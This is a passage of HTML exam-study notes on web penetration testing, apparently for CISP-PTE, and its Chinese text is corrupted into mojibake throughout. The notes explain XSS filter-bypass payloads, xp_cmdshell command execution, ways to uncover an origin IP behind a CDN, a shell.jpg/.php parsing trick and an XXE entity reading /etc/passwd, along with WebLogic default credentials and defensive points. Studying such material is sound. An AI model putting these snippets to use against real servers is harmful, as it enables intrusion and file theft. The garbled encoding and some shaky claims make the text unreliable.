<li><strong>A. æ‰°ä¹±è¿‡æ»¤è§„åˆ™ï¼š</strong>Â ä¾‹å¦‚ï¼Œä½¿ç”¨å¤§å°å†™æ··æ·† (<code>&lt;ScRipt&gt;</code>)ã€åŒå†™å…³é”®å­— (<code>&lt;scr&lt;script&gt;ipt&gt;</code>) ç­‰æ–¹å¼æ¥è¿·æƒ‘åŸºäºé»‘åå•çš„è¿‡æ»¤å™¨ã€‚</li>
<li><strong>B. åˆ©ç”¨ç©ºå­—ç¬¦ (Null Byte)ï¼š</strong>Â æ’å…¥Â \x00Â ç­‰å­—ç¬¦å¯èƒ½ä¼šæˆªæ–­è¿‡æ»¤å™¨çš„å­—ç¬¦ä¸²å¤„ç†ï¼Œä»è€Œç»•è¿‡æ£€æµ‹ã€‚</li>
<li><strong>C. åˆ©ç”¨HTMLæ ‡ç­¾çš„å±æ€§å€¼</strong>ï¼šè¿™ä¹Ÿæ˜¯ä¸€ç§ç»•è¿‡æŠ€å·§ã€‚å½“è¿‡æ»¤å™¨ä¸¥æ ¼ç¦æ­¢Â <code>&lt;script&gt;Â </code>æ ‡ç­¾æ—¶ï¼Œæ”»å‡»è€…ä¼šåˆ©ç”¨<code>Â &lt;img&gt;,Â &lt;a&gt;,Â &lt;svg&gt;Â </code>ç­‰æ ‡ç­¾çš„äº‹ä»¶å¤„ç†å±æ€§ï¼ˆå¦‚Â onerror,Â onload,Â onmouseoverï¼‰æˆ–ä¼ªåè®®ï¼ˆhref&#x3D;â€javascript:â€¦â€ï¼‰æ¥æ‰§è¡Œè„šæœ¬ã€‚è¿™æ˜¯ç»•è¿‡äº†å¯¹ç‰¹å®šæ ‡ç­¾çš„è¿‡æ»¤ã€‚</li>
</ul>
</li>
<li><strong>xp_cmdshell</strong>Â æ˜¯ Microsoft SQL Server ä¸­ä¸€ä¸ªè‘—åçš„æ‰©å±•å­˜å‚¨è¿‡ç¨‹ï¼Œå®ƒå…è®¸å…·æœ‰ç›¸åº”æƒé™çš„æ•°æ®åº“ç”¨æˆ·æ‰§è¡Œæ“ä½œç³»ç»Ÿçš„ shell å‘½ä»¤ã€‚å¯¹äºæ¸—é€æµ‹è¯•è€…æ¥è¯´ï¼Œä¸€æ—¦é€šè¿‡ SQL æ³¨å…¥è·å¾—äº†Â saÂ æˆ–ç­‰æ•ˆæƒé™ï¼Œæ‰§è¡ŒÂ xp_cmdshellÂ æ¥æ·»åŠ ç³»ç»Ÿç”¨æˆ·ã€åå¼¹ shell æˆ–æ‰§è¡Œå…¶ä»–å‘½ä»¤æ˜¯å¸¸è§çš„åæ¸—é€æ“ä½œã€‚<ul>
<li><strong>xp_dirtree</strong>Â ç”¨äºåˆ—å‡ºç›®å½•å†…å®¹</li>
<li><strong>xp_regdeletekey</strong>Â (é¢˜ç›®ä¸­å†™ä¸º xpdeletekey) ç”¨äºåˆ é™¤æ³¨å†Œè¡¨é”®</li>
<li><strong>xp_cmdshell</strong>Â æ˜¯é€šç”¨çš„å‘½ä»¤æ‰§è¡Œå…¥å£</li>
</ul>
</li>
<li><strong>CDN</strong> (Content Delivery Network) çš„åŸç†å°±æ˜¯å°†ç”¨æˆ·çš„è¯·æ±‚å¯¼å‘ç¦»ä»–æœ€è¿‘çš„â€œè¾¹ç¼˜èŠ‚ç‚¹â€ï¼Œè¿™äº›èŠ‚ç‚¹çš„ IP åœ°å€å°±æ˜¯ä½ ç›´æ¥è®¿é—®æ—¶çœ‹åˆ°çš„åœ°å€ã€‚çœŸå® IP (æºç«™ IP) æ˜¯éšè—åœ¨ CDN ç½‘ç»œä¹‹åçš„ã€‚<br>å¯ä»¥æ‰¾åˆ°çœŸå®ipçš„æ–¹æ³•<ul>
<li><strong>SSLè¯ä¹¦</strong>ï¼š é€šè¿‡ Censysã€Shodan ç­‰æœç´¢å¼•æ“æŸ¥è¯¢ç½‘ç«™çš„ SSL è¯ä¹¦ï¼Œæœ‰æ—¶è¯ä¹¦çš„ç­¾å‘å†å²æˆ–å…³è”çš„å…¶ä»–åŸŸåä¼šæš´éœ²æºç«™ IP</li>
<li><strong>å†å²DNSæŸ¥è¯¢</strong>ï¼š åœ¨ç½‘ç«™ä½¿ç”¨ CDN ä¹‹å‰ï¼Œå…¶åŸŸåå¯èƒ½ç›´æ¥è§£æåˆ°æºç«™ IPã€‚</li>
<li><strong>WiresharkæŠ“åŒ…</strong>ï¼ˆæœ‰æ—¶å¯ä»¥ï¼‰ï¼šå½“åœ¨å±€åŸŸç½‘ã€æºæœåŠ¡å™¨ï¼ŒCDNæ²¡æœ‰ç¼“å­˜æ—¶æŠ“åŒ…å¯ä»¥</li>
<li><strong>å­åŸŸå&#x2F;é‚®ä»¶æœåŠ¡å™¨</strong>ï¼š ç½‘ç«™çš„æŸäº›å­åŸŸåå¯èƒ½æ²¡èµ°CDN</li>
<li><strong>å°è¯•æ‰«æå…¶ä»–ç«¯å£</strong>ï¼š å¯èƒ½åªåœ¨80&#x2F;443ç«¯å£é…ç½®äº†CDN</li>
<li><strong>å…¨çƒPING</strong>ï¼šä»ä¸–ç•Œå„åœ° PING åŸŸåï¼Œåªä¼šå¾—åˆ°ä¸åŒåœ°æ–¹çš„ CDN è¾¹ç¼˜èŠ‚ç‚¹çš„ IPï¼Œè¿™æ°æ°è¯æ˜äº† CDN åœ¨æ­£å¸¸å·¥ä½œï¼Œæ— æ³•æ‰¾åˆ°æºç«™ã€‚ä½†æ˜¯ï¼Œå­˜åœ¨ä¸€ç§<strong>æç«¯æƒ…å†µ</strong>ï¼šå¦‚æœæŸä¸ªåœ°åŒºçš„ CDN ç½‘ç»œå‡ºç°æ•…éšœ<br>WiresharkæŠ“åŒ…å’Œå…¨çƒPingéƒ½æœ‰å¯èƒ½æ‰¾ä¸åˆ°çœŸå®IP</li>
</ul>
</li>
<li>PHP CGIè§£ææ¼æ´å‡ºç°çš„åŸå› æ˜¯<strong>cgi.fix_pathinfoé…ç½®é”™è¯¯</strong> <a href="cisp-pte%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0.md#%5Ey">è¯¾ç¨‹ç¬”è®°</a> <ul>
<li>æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ä¸€ä¸ªå†…å®¹ä¸º PHP ä»£ç çš„å›¾ç‰‡æ–‡ä»¶ï¼ˆå¦‚Â shell.jpgï¼‰ï¼Œç„¶åè®¿é—®Â <a href="http://host/shell.jpg/.php%EF%BC%8C%E4%BB%8E%E8%80%8C%E8%AE%A9%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B0%86%E5%9B%BE%E7%89%87%E4%BD%9C%E4%B8%BA">http://host/shell.jpg/.phpï¼Œä»è€Œè®©æœåŠ¡å™¨å°†å›¾ç‰‡ä½œä¸º</a> PHP ä»£ç æ‰§è¡Œã€‚</li>
</ul>
</li>
<li>XXE (XML External Entity Injection) å³ XML å¤–éƒ¨å®ä½“æ³¨å…¥ï¼Œæ˜¯ä¸€ä¸ª<strong>æœåŠ¡å™¨ç«¯</strong>æ¼æ´ã€‚å½“åº”ç”¨ç¨‹åºçš„ XML è§£æå™¨é…ç½®ä¸å½“ï¼Œå…è®¸è§£ææ¥è‡ªå¤–éƒ¨çš„å®ä½“æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ XML æ•°æ®æ¥å®æ–½æ”»å‡»ã€‚<br>XXE çš„ä¸»è¦å±å®³ï¼š<ul>
<li><strong>è¯»å–ä»»æ„æ–‡ä»¶ï¼š</strong>Â é€šè¿‡Â file:&#x2F;&#x2F;Â åè®®è¯»å–æœåŠ¡å™¨ä¸Šçš„æœ¬åœ°æ–‡ä»¶ï¼Œå¦‚Â <!ENTITY xxe SYSTEM "file:///etc/passwd">ã€‚</li>
<li><strong>å‘èµ· SSRF æ”»å‡»ï¼š</strong>Â é€šè¿‡Â http:&#x2F;&#x2F;Â ç­‰åè®®ï¼Œè®©æœåŠ¡å™¨ä½œä¸ºä»£ç†å»è®¿é—®å†…ç½‘æˆ–å¤–éƒ¨èµ„æºã€‚</li>
<li><strong>è¿›è¡Œ DoS æ”»å‡»ï¼š</strong>Â é€šè¿‡â€œåäº¿ç¬‘å¼¹â€(Billion Laughs Attack) ç­‰æ–¹å¼è€—å°½æœåŠ¡å™¨èµ„æºã€‚</li>
</ul>
</li>
<li><strong>Tomcat</strong> åªèƒ½ç®—è½»é‡çº§ Web å®¹å™¨ï¼Œè€Œ <strong>WebLogic</strong> æ˜¯é‡é‡çº§åº”ç”¨æœåŠ¡å™¨ï¼Œæ”¯æŒæ›´å¤æ‚çš„ä¼ä¸šåº”ç”¨ã€‚weblogicçš„é»˜è®¤ç”¨æˆ·åå’Œé»˜è®¤å£ä»¤éƒ½æ˜¯<strong>weblogic</strong></li>
<li>Apacheçš„é…ç½®æ–‡ä»¶ä¸­<strong>CustomLog</strong>å®šä¹‰äº†è®¿é—®æ—¥å¿—çš„è·¯å¾„<ul>
<li>åœ¨ Apache çš„é…ç½®æ–‡ä»¶ (httpd.conf) ä¸­ï¼ŒCustomLogÂ æŒ‡ä»¤ç”¨äºè®¾ç½®è®¿é—®æ—¥å¿—çš„æ–‡ä»¶è·¯å¾„å’Œæ—¥å¿—æ ¼å¼ã€‚</li>
<li>ä¾‹å¦‚ï¼šCustomLog â€œ&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.logâ€ commonã€‚</li>
<li>ErrorLogÂ æŒ‡ä»¤ç”¨äºå®šä¹‰é”™è¯¯æ—¥å¿—çš„è·¯å¾„ã€‚AccessLogÂ å¹¶ä¸æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ Apache æŒ‡ä»¤ï¼Œè™½ç„¶æ–‡ä»¶åé€šå¸¸å«Â access.logã€‚</li>
</ul>
</li>
<li>å¸¸è§çš„HTTPçŠ¶æ€ç ï¼š<ul>
<li><strong>401 Unauthorized (æœªæˆæƒ):</strong>Â è¡¨ç¤ºè¯·æ±‚éœ€è¦ HTTP è®¤è¯ï¼Œæˆ–è€…è®¤è¯å¤±è´¥ã€‚é€šä¿—åœ°è¯´ï¼Œæ˜¯â€œä½ è¿˜æ²¡ç™»å½•ï¼Œæˆ–è€…ç™»å½•å¤±è´¥â€ã€‚</li>
<li><strong>403 Forbidden (ç¦æ­¢):</strong>Â è¡¨ç¤ºæœåŠ¡å™¨ç†è§£äº†è¯·æ±‚ï¼Œä½†æ˜¯æ‹’ç»æ‰§è¡Œå®ƒã€‚é€šä¿—åœ°è¯´ï¼Œæ˜¯â€œä½ å·²ç»ç™»å½•äº†ï¼Œä½†ä½ çš„èº«ä»½æ²¡æœ‰æƒé™è®¿é—®è¿™ä¸ªèµ„æºâ€ã€‚è¿™ä¸é¢˜ç›®ä¸­çš„â€œæ²¡æƒé™è®¿é—®â€å®Œå…¨å¯¹åº”ã€‚</li>
<li><strong>200 OK:</strong>Â è¯·æ±‚æˆåŠŸã€‚ </li>
<li><strong>500 Internal Server Error:</strong>Â æœåŠ¡å™¨å†…éƒ¨é”™è¯¯ã€‚</li>
</ul>
</li>
<li>.htaccessÂ æ˜¯ Apache æœåŠ¡å™¨çš„åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥å¯¹æ‰€åœ¨ç›®å½•åŠå…¶å­ç›®å½•çš„é…ç½®è¿›è¡Œè¦†ç›–ã€‚<br>å¯ä»¥åšåˆ°çš„ï¼š<ul>
<li>ErrorDocument 404 &#x2F;notfound.htmlÂ æ¥<strong>è‡ªå®šä¹‰é”™è¯¯é¡µé¢</strong>ã€‚</li>
<li>DirectoryIndex index.php default.htmlÂ æ¥<strong>é…ç½®é»˜è®¤æ–‡æ¡£</strong>ã€‚</li>
<li>Options -IndexesÂ æ¥<strong>ç¦æ­¢ç›®å½•åˆ—è¡¨</strong>ã€‚</li>
<li>è¿˜å¯ä»¥è®¾ç½® URL é‡å†™ã€è®¿é—®æ§åˆ¶ï¼ˆåŸºäº IP æˆ–ç”¨æˆ·è®¤è¯ï¼‰ç­‰ã€‚<br>ä¸å¯ä»¥åšåˆ°çš„:</li>
<li>ä½ å¯ä»¥åœ¨Â .htaccessÂ ä¸­é…ç½®ä¸€ä¸ªç›®å½•éœ€è¦å¯†ç ä¿æŠ¤ï¼ˆAuthType,Â AuthUserFileÂ ç­‰æŒ‡ä»¤ï¼‰ï¼Œä½†ç”¨æˆ·å¯†ç æœ¬èº«æ˜¯å­˜å‚¨åœ¨Â AuthUserFileÂ æŒ‡ä»¤æ‰€æŒ‡å‘çš„å¦ä¸€ä¸ªæ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯Â <strong>.htpasswd</strong>ï¼‰ä¸­çš„ã€‚<strong>.htaccessÂ æ–‡ä»¶æœ¬èº«ä¸ç”¨äºå­˜å‚¨æˆ–ä¿®æ”¹å¯†ç </strong>ã€‚</li>
</ul>
</li>
<li>é˜²å¾¡æ–‡ä»¶åŒ…å«æ¼æ´çš„æ–¹æ³•åŒ…æ‹¬ï¼š<ul>
<li>ç¦æ­¢æ–‡ä»¶åä¸­åŒ…å«å­—æ¯å’Œæ•°å­—ä¹‹å¤–çš„å­—ç¬¦</li>
<li>ç¦æ­¢è‡ªå®šä¹‰æ–‡ä»¶å</li>
<li>æ–‡ä»¶åä¸­ç¦æ­¢å‡ºç°ç›®å½•å<br>è€Œç¦æ­¢ä¸ºæ–‡ä»¶ä¸Šä¼ åªèƒ½é˜²å¾¡æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ”»å‡»è€…è¿˜æ˜¯å¯ä»¥è¯»å–æœåŠ¡å™¨ä¸ŠåŸæœ‰çš„æ–‡ä»¶</li>
</ul>
</li>
<li>SSRF æ˜¯<strong>æœåŠ¡ç«¯</strong>è¯·æ±‚ä¼ªé€ æ¼æ´ã€‚ CSRFæ˜¯é’ˆå¯¹<strong>æµè§ˆå™¨</strong>çš„è¯·æ±‚ä¼ªé€ æ¼æ´</li>
<li>.phtä¸æ˜¯Apacheçš„é»˜è®¤è§£æåç¼€ã€‚ï¼Œå®ƒæ›´å¤šåœ°æ˜¯ä½œä¸ºä¸€ç§<strong>ç»•è¿‡ä¸Šä¼ é™åˆ¶</strong>çš„æŠ€å·§è€Œè¢«æ”»å‡»è€…ä½¿ç”¨<ul>
<li>.php3,Â .php5Â (ä»¥åŠ .php4, .php7) æ˜¾ç„¶æ˜¯ä»£è¡¨ä¸åŒ PHP ç‰ˆæœ¬æ—¶æœŸçš„åç¼€ï¼Œç»å¸¸è¢«é…ç½®ã€‚</li>
<li>.phtmlÂ (PHP in HTML) ä¹Ÿæ˜¯ä¸€ä¸ªå†å²æ‚ ä¹…ä¸”å¸¸è§çš„é…ç½®ï¼Œç”¨äºè¡¨ç¤ºå†…åµŒ PHP ä»£ç çš„ HTML æ–‡ä»¶ã€‚</li>
</ul>
</li>
<li>æ•°æ®åº“ç†è®ºçš„åŸºç¡€æ¦‚å¿µ<br>ä¸»é”®å”¯ä¸€æ ‡è¯†è¡¨ç»„ä¸­çš„è¡Œ<ul>
<li><strong>ä¸»é”® (Primary Key):</strong>Â è¡¨ä¸­ä¸€ä¸ªæˆ–å¤šä¸ªå­—æ®µçš„ç»„åˆï¼Œå®ƒçš„å€¼èƒ½<strong>å”¯ä¸€</strong>åœ°æ ‡è¯†è¡¨ä¸­çš„æ¯ä¸€è¡Œã€‚ä¸»é”®ä¸èƒ½ä¸ºç©º (NOT NULL)ã€‚</li>
<li><strong>è¶…é”® (Superkey):</strong>Â åŒæ ·èƒ½å”¯ä¸€æ ‡è¯†ä¸€è¡Œçš„å±æ€§é›†ï¼Œä½†å®ƒä¸æ˜¯æœ€å°çš„ã€‚ä¸»é”®æ˜¯â€œæœ€å°çš„è¶…é”®â€ã€‚ï¼ˆä¾‹å¦‚ï¼Œï¼ˆå­¦å·ï¼Œèº«ä»½è¯å·ï¼‰æ˜¯è¶…é”®ï¼Œä½†å­¦å·æœ¬èº«å°±æ˜¯ä¸»é”®&#x2F;æœ€å°è¶…é”®ï¼‰ã€‚</li>
<li><strong>å¤–é”® (Foreign Key):</strong>Â ä¸€ä¸ªè¡¨ä¸­ç”¨äºå¼•ç”¨å¦ä¸€ä¸ªè¡¨ä¸»é”®çš„å­—æ®µï¼Œç”¨äºå»ºç«‹ä¸¤ä¸ªè¡¨ä¹‹é—´çš„å…³è”ã€‚</li>
<li><strong>æœ¬åœ°é”® (Local Key):</strong>Â ä¸æ˜¯ä¸€ä¸ªæ ‡å‡†çš„å…³ç³»æ•°æ®åº“æœ¯è¯­ã€‚</li>
</ul>
</li>
<li>Tomcatæ²¡æœ‰å‡ºç°è¿‡è§£ææ¼æ´ <a href="cisp-pte%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0.md#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E">ä¸­é—´ä»¶æ¼æ´</a><ul>
<li><strong>IIS:</strong>Â å‡ºç°è¿‡å¤šç§è§£ææ¼æ´ï¼Œå¦‚Â xx.asp;xx.jpgï¼ˆç›®å½•è§£æï¼‰ã€xx.asp&#x2F;xx.jpgï¼ˆæ–‡ä»¶è§£æï¼‰ã€‚</li>
<li><strong>Nginx:</strong>Â å‡ºç°è¿‡è‘—åçš„ PHP CGI è§£ææ¼æ´ (&#x2F;xx.jpg&#x2F;.php)ã€‚</li>
<li><strong>Apache:</strong>Â å‡ºç°è¿‡å¤šåç¼€è§£ææ¼æ´ï¼ˆä»å³å‘å·¦è§£æï¼Œå¦‚Â xx.php.rarÂ ä¼šè¢«å½“åš PHP æ‰§è¡Œï¼‰ã€‚</li>
<li><strong>Tomcat:</strong>Â æ˜¯ä¸€ä¸ª Java Servlet å®¹å™¨å’Œ JSP å¼•æ“ã€‚å®ƒçš„è¯·æ±‚åˆ†å‘å’Œå¤„ç†æ˜¯åŸºäºÂ web.xmlÂ ä¸­é…ç½®çš„ Servlet-mappingï¼Œè€Œä¸æ˜¯åƒä¸Šè¿°æœåŠ¡å™¨é‚£æ ·åŸºäºæ–‡ä»¶åç¼€ã€‚å› æ­¤ï¼Œå®ƒä¸å®¹æ˜“å‡ºç°ä¸Šè¿°ç±»å‹çš„â€œè§£ææ¼æ´â€ã€‚è™½ç„¶ Tomcat æœ‰è¿‡å¾ˆå¤šå…¶ä»–ç±»å‹çš„æ¼æ´ï¼ˆå¦‚æ–‡ä»¶ä¸Šä¼ ã€ååºåˆ—åŒ–ï¼‰ï¼Œä½†è¿™ç§ç‰¹å®šç±»å‹çš„è§£ææ¼æ´å¹¶éå…¶å…¸å‹ç‰¹å¾ã€‚</li>
</ul>
</li>
<li>å½“äº¤æ¢æœºæ”¶åˆ°ä¸€ä¸ªç›®çš„macä¸º68-A3-C4-29-82-F2çš„æ•°æ®åŒ…ï¼Œä½†æ­¤MACåœ°å€ä¸åœ¨äº¤æ¢æœºçš„MACåœ°å€è¡¨ä¸­ï¼Œ<strong>äº¤æ¢æœºä¼šæŠŠæ•°æ®åŒ…ä»æ‰€æœ‰æ¥å£å¤åˆ¶å‘é€ä¸€éï¼ˆé™¤å»æ¥æ”¶æ¥å£ï¼‰</strong><ul>
<li>äº¤æ¢æœºå†…éƒ¨ç»´æŠ¤ä¸€å¼  MAC åœ°å€è¡¨ï¼Œè®°å½•äº† MAC åœ°å€ä¸äº¤æ¢æœºç«¯å£çš„å¯¹åº”å…³ç³»ã€‚</li>
<li>å½“æ”¶åˆ°ä¸€ä¸ªæ•°æ®å¸§æ—¶ï¼Œäº¤æ¢æœºæŸ¥çœ‹å…¶<strong>ç›®çš„ MAC åœ°å€</strong>ï¼š<ul>
<li>å¦‚æœåœ¨ MAC åœ°å€è¡¨ä¸­æ‰¾åˆ°å¯¹åº”çš„ç«¯å£ï¼Œå°±å°†è¯¥å¸§åªä»é‚£ä¸ªç«¯å£è½¬å‘å‡ºå»ï¼ˆå•æ’­ï¼‰ã€‚</li>
<li>å¦‚æœæ‰¾ä¸åˆ°å¯¹åº”çš„ç«¯å£ï¼ˆæœªçŸ¥å•æ’­å¸§ï¼‰ï¼Œäº¤æ¢æœºä¸ºäº†ç¡®ä¿æ•°æ®èƒ½åˆ°è¾¾ç›®çš„åœ°ï¼Œä¼šé‡‡å–<strong>æ³›æ´ª (Flooding)</strong>Â çš„æ–¹å¼ï¼Œå³æŠŠè¿™ä¸ªæ•°æ®å¸§ä»<strong>é™¤äº†æ¥æ”¶ç«¯å£ä¹‹å¤–çš„æ‰€æœ‰å…¶ä»–ç«¯å£</strong>è½¬å‘å‡ºå»ã€‚</li>
</ul>
</li>
<li>ARP è¯·æ±‚æ˜¯è·¯ç”±å™¨æˆ–ä¸»æœºç”¨æ¥æŸ¥æ‰¾ IP å¯¹åº” MAC åœ°å€çš„ï¼Œäº¤æ¢æœºå·¥ä½œåœ¨ç¬¬äºŒå±‚ï¼Œä¸å¤„ç† ARP è¯·æ±‚ã€‚</li>
</ul>
</li>
<li>å½“ä¸€ä¸ªHTTPS ç«™ç‚¹çš„è¯ä¹¦å­˜åœ¨é—®é¢˜æ—¶ï¼Œæµè§ˆå™¨å°±ä¼šå‡ºç°è­¦å‘Šä¿¡æ¯å·²æé†’æµè§ˆè€…æ³¨æ„ï¼Œ<strong>ä¸æ˜¯</strong>å¯¼è‡´å‡ºç°æç¤ºçš„å¿…ç„¶åŸå› çš„æ˜¯ <strong>æµè§ˆå™¨æ‰¾ä¸åˆ°å¯¹åº”çš„è¯ä¹¦é¢å‘æœºæ„</strong><ul>
<li>B (è¿‡æœŸ) å’Œ C (åŸŸåä¸åŒ¹é…) éƒ½æ˜¯ä¼šå¯¼è‡´è­¦å‘Šçš„ç›´æ¥ã€å…·ä½“åŸå› ã€‚</li>
<li>D (è¯ä¹¦ä¸è¢«ä¿¡ä»») æ˜¯ä¸€ä¸ªæ€»æ‹¬æ€§çš„åŸå› ï¼Œå‡ ä¹æ‰€æœ‰è¯ä¹¦è­¦å‘Šéƒ½å¯ä»¥å½’ç»“ä¸ºæ­¤ã€‚</li>
<li>A (æ‰¾ä¸åˆ° CA) æ˜¯å¯¼è‡´ D (ä¸è¢«ä¿¡ä»») çš„ä¸€ä¸ª<strong>å…·ä½“åŸå› </strong>ã€‚</li>
<li>é‚£ä¹ˆä¸ºä»€ä¹ˆ A ä¸æ˜¯â€œå¿…ç„¶åŸå› â€å‘¢ï¼Ÿå› ä¸ºä¸€ä¸ªè¯ä¹¦ä¸è¢«ä¿¡ä»»ï¼Œè¿˜å¯èƒ½æœ‰å…¶ä»–åŸå› ã€‚ä¾‹å¦‚ï¼Œæµè§ˆå™¨<strong>èƒ½å¤Ÿæ‰¾åˆ°</strong>å¯¹åº”çš„è¯ä¹¦é¢å‘æœºæ„ï¼ˆCA çš„æ ¹è¯ä¹¦åœ¨æµè§ˆå™¨çš„ä¿¡ä»»åº“é‡Œï¼‰ï¼Œä½†æ˜¯è¿™ä¸ª CA æœ€è¿‘å› ä¸ºä½œæ¶ï¼ˆå¦‚ DigiNotar äº‹ä»¶ï¼‰è€Œè¢«æµè§ˆå™¨å‚å•†<strong>æ˜ç¡®åœ°åˆ—å…¥äº†ä¸ä¿¡ä»»åˆ—è¡¨</strong>ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒD ä¸ºçœŸï¼Œä½† A ä¸ºå‡ã€‚å› æ­¤ï¼Œâ€œæ‰¾ä¸åˆ° CAâ€ åªæ˜¯ä¸è¢«ä¿¡ä»»çš„å¤šç§åŸå› ä¹‹ä¸€ï¼Œè€Œä¸æ˜¯å¿…ç„¶åŸå› ã€‚</li>
</ul>
</li>
<li>åŒæºç­–ç•¥ä¸èƒ½é˜²å¾¡XSSæ”»å‡» ^id1<br>é˜²å¾¡XSSæªæ–½æœ‰ï¼š ^3fa9f3<ul>
<li><strong>ç¼–ç  (Encoding):</strong>Â åœ¨è¾“å‡ºç”¨æˆ·æ•°æ®åˆ° HTML é¡µé¢æ—¶ï¼Œå¯¹Â &lt;ã€&gt;ã€â€Â ç­‰ç‰¹æ®Šå­—ç¬¦è¿›è¡Œ HTML å®ä½“ç¼–ç ï¼Œæ˜¯é˜²å¾¡ XSS çš„æ ¹æœ¬æ–¹æ³•ã€‚</li>
<li><strong>è¿‡æ»¤ (Filtering):</strong>Â åœ¨è¾“å…¥æˆ–è¾“å‡ºæ—¶ï¼Œç§»é™¤æˆ–æ‹¦æˆªÂ scriptÂ ç­‰å±é™©æ ‡ç­¾å’Œå±æ€§ï¼Œæ˜¯ä¸€ç§é˜²å¾¡ç­–ç•¥ï¼Œä½†å®¹æ˜“è¢«ç»•è¿‡ã€‚</li>
<li><strong>CSP (Content Security Policy):</strong>Â ä¸€ç§å¼ºå¤§çš„ç°ä»£é˜²å¾¡æœºåˆ¶ï¼Œé€šè¿‡ HTTP å¤´å‘Šè¯‰æµè§ˆå™¨åªå…è®¸ä»æŒ‡å®šçš„æ¥æºåŠ è½½è„šæœ¬ç­‰èµ„æºï¼Œå¯ä»¥æœ‰æ•ˆç¼“è§£ XSS æ”»å‡»ã€‚<br>åŒæºç­–ç•¥ï¼š</li>
<li><strong>A. åŒæºç­–ç•¥ (Same-Origin Policy)</strong>Â æ˜¯æµè§ˆå™¨çš„ä¸€ä¸ªæ ¸å¿ƒå®‰å…¨æœºåˆ¶ï¼Œå®ƒé™åˆ¶äº†æ¥è‡ªä¸€ä¸ªæºçš„æ–‡æ¡£æˆ–è„šæœ¬å¦‚ä½•ä¸æ¥è‡ªå¦ä¸€ä¸ªæºçš„èµ„æºè¿›è¡Œäº¤äº’ã€‚ç„¶è€Œï¼Œ<strong>XSS æ”»å‡»çš„è„šæœ¬æ˜¯åœ¨å—å®³è€…ç½‘ç«™çš„æº (origin) ä¸­æ‰§è¡Œçš„</strong>ï¼Œå› æ­¤åŒæºç­–ç•¥<strong>ä¸èƒ½</strong>é˜»æ­¢ XSS è„šæœ¬è¯»å–è¯¥ç½‘ç«™çš„ Cookie æˆ–æ“ä½œè¯¥ç½‘ç«™çš„ DOMã€‚å¯ä»¥è¯´ï¼ŒXSS æ”»å‡»ä¹‹æ‰€ä»¥å±é™©ï¼Œæ­£æ˜¯å› ä¸ºå®ƒç»•è¿‡äº†åŒæºç­–ç•¥çš„é™åˆ¶ã€‚</li>
</ul>
</li>
<li>å¸¸è§æœåŠ¡ç«¯å£å·ï¼š<ul>
<li><strong>3306:</strong>Â MySQL</li>
<li><strong>1433:</strong>Â Microsoft SQL Server</li>
<li><strong>1521:</strong>Â Oracle Database</li>
<li><strong>6379:</strong>Â Redis</li>
</ul>
</li>
<li>åœ¨åŒä¸€ä¸ªbash ä¸‹ä¾æ¬¡æ‰§è¡Œ root@kaliï¼š<del>&#x2F;Desktop# whoami root root@kaliï¼š</del>&#x2F;Desktop# function whoami() { echo 1;} root@kaliï¼š~&#x2F;Desktop# whoami æœ€åä¸€æ¬¡æ‰§è¡Œçš„whoami çš„ç»“æœæ˜¯1<ol>
<li>ç¬¬ä¸€æ¬¡æ‰§è¡ŒÂ whoamiï¼ŒShell åœ¨Â PATHÂ ç¯å¢ƒå˜é‡ä¸­æ‰¾åˆ°äº†Â &#x2F;usr&#x2F;bin&#x2F;whoamiÂ è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œå®ƒï¼Œè¾“å‡ºÂ rootã€‚</li>
<li>ç¬¬äºŒæ¬¡æ‰§è¡ŒÂ function whoami() { echo 1;}ï¼Œåœ¨å½“å‰ Shell çš„å†…å­˜ä¸­å®šä¹‰äº†ä¸€ä¸ªåä¸ºÂ whoamiÂ çš„å‡½æ•°ã€‚</li>
<li>ç¬¬ä¸‰æ¬¡æ‰§è¡ŒÂ whoamiï¼ŒShell å¼€å§‹å¯»æ‰¾è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚å®ƒçš„æŸ¥æ‰¾é¡ºåºé€šå¸¸æ˜¯ï¼š<strong>åˆ«å (alias) -&gt; å‡½æ•° (function) -&gt; å†…å»ºå‘½ä»¤ (builtin) -&gt;Â PATHÂ ä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶</strong>ã€‚</li>
</ol>
<ul>
<li>ç”±äºç°åœ¨å­˜åœ¨ä¸€ä¸ªåä¸ºÂ whoamiÂ çš„å‡½æ•°ï¼Œå®ƒçš„ä¼˜å…ˆçº§é«˜äºÂ PATHÂ ä¸­çš„Â &#x2F;usr&#x2F;bin&#x2F;whoamiã€‚å› æ­¤ï¼ŒShell ä¼šæ‰§è¡Œè¿™ä¸ªå‡½æ•°ã€‚</li>
<li>å‡½æ•°çš„å†…å®¹æ˜¯Â echo 1ï¼Œæ‰€ä»¥æœ€ç»ˆè¾“å‡ºçš„ç»“æœå°±æ˜¯Â 1ã€‚</li>
</ul>
</li>
<li><strong>è¶Šæƒã€XSSã€CSRF</strong>éƒ½å¯ä»¥å¤§æ‰¹é‡è·å–ç½‘ç«™æ³¨å†Œç”¨æˆ·çš„èº«ä»½ä¿¡æ¯</li>
</ol>
<h2 id="ç¬¬äºŒä»½"><a href="#ç¬¬äºŒä»½" class="headerlink" title="ç¬¬äºŒä»½"></a>ç¬¬äºŒä»½</h2><ol>
